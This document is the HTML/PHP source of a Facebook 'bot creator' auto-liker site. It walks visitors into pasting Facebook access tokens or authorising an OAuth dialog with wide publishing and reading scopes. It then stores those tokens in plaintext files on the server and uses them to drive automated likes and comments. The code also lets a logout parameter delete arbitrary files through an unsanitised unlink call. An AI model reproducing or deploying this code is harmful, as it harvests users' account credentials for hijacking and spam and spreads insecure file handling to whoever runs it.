<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SaqlainAbbas</title>
  <div id="header">

<link rel="shortcut icon" type="image/png" href="http://www.saqlainabbas.tk" />
<style>

@font-face {

    font-family: miaanFont;

    src: url(dragon.ttf);

}

a

{

  text-decoration: none;

  color:white;

}

#footer

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 65%;	

}

.form

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 40%;

}

.form1

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 55%;

}

.access

{

	position: absolute;

	vertical-align: center;

	width: 98%;

}

.access h2

{

	margin-top: -15px;

}

input[type=text] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

input[type=password] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

.button {

	font-family:miaanFont;

    height: 5%;

    background-color: black; /* Green */

    border: 2px solid white;

    color: white;

    padding: 8px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 22px;

    margin: 4px 2px;

    -webkit-transition-duration: 0.4s; /* Safari */

    transition-duration: 0.4s;

    cursor: pointer;

}



.button1 {

    background-color: black;

    color: white;

    border-radius:50px;

}



.button1:hover {

    background-color: white;

    color: black;

}

body {background: #000 url(images.jpg);margin:0;padding:0;color: #eee;background-size: 1300px 800px;background-repeat: no-repeat;background-position: center
top;}
</style>

</head>

<body bgcolor="#8B008B">

<font style="color:red;font-size:26px;font-family:miaanFont">  <h2 align="center"><font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:white; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:90px;"><b>Saqlain Abbas Bot Creater</b></font></h2>
<h2 align="center"><font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:#000; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em red;font-family:miaanFont;font-size:50px;"><b><a href="http://www.saqlainabbas.tk" target="_blank"> www.saqlainabbas.tk </a></b></font></h2>     
<div class="aclb">
<div class="acy apl abt abb">
<span class="sec" >
<center><b><script type="text/javascript" src="judul.js"></script></b></center></span>
</div>
<script type="text/javascript" src="http://www.Saqlainabbas.tk"></script>



<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $cokis[]=$b.'='.$c;
}
$true='?'.implode('&',$cokis);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by Sunny',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('cokis')){
        mkdir('cokis');
}
if($bb){
$blue=fopen('cokis/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
        if($z){
if(file_exists('cokis/'.$id)){
$file=file_get_contents('cokis/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('cokis/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Your Comment is Change , GooD Luck!")</script>';}}
}

public function lOgbot($d){
        unlink('cokis/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('cokis/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like & Comment';
}else{
        $satu='off';
        $ak='Like Only';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';
}else{
        $tiga='off';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link"> Welcome '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="red">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Click Button Save</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like Only</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like & Comment</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<div id="header">
<h1 class="heading">
</h1>

<center>
<div id="header">

<h2 class="description">
<b>

</h2></div>';
} 

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<center><a href="http://facebook.com/saqlainabbasofficial"><img src="https://graph.facebook.com/100009031208006/picture?type=large" alt="Profile" style="width:250px; height:250px;border: 2px;border-radius: 50%;" data-pagespeed-url-hash="1820703895" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a>
<br><center>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<iframe src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/100009031208006&layout=button_count&amp;show_faces=false&colorscheme=light&font=lucida+grande&amp;width=105&appId=281570931938574" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:50px;" allowTransparency="true"></iframe>
</div></div></div>



<h2 class="title">
<div class="post-content">

<center></head>
    <body>
        <div id="main">
            <div id="content">
                <div class="header">
<span class="mfss fcg">
</span>
</div></center><br>
<span>
<br>
</span>
</div>

<div class="post-meta2">
</div></div></div>';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
</span>
</div></center><br>
<center><a href="tkn.php" target="blank">• Get Token ( Nokia ) •</a></center>
<center><a href="token" target="blank">• Get Token ( Android,iOS,Ipohne ) •</a></center>
<center><a href="bhtoken" target="blank">• Get Token ( photo ) •</a></center>
<br><center>
<ul>
</center>
<div style="border-top: 1px #ccc solid; margin-top: 10px;"></div></br>
<center><a href="http://www.SaqlainAbbas.Tk" target="blank">• FOR NEW SCRIPTS CLICK HERE •</a></center>
<div id="top-content">
<div id="search-form">

<center><form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <td class="btnCell"><input
value="Submit" type="submit" class="button button1" data-sigil="composer-
submit"/></form></center></div></div></div>';

$this->membEr();
}

public function membEr(){
        if(!is_dir('cokis')){
        mkdir('cokis');
}
$up=opendir('cokis');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<center>
Bot Lovers : <font color="lime">'.count($user).'</font> </center>
';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Jaan Token fir se lo")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<script> 
(function() { 
var v = document.createElement('script'); v.async = true; 
v.src = "http://assets-prod.vicomi.com/vicomi.js"; 
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(v, s); 
})(); 
</script>
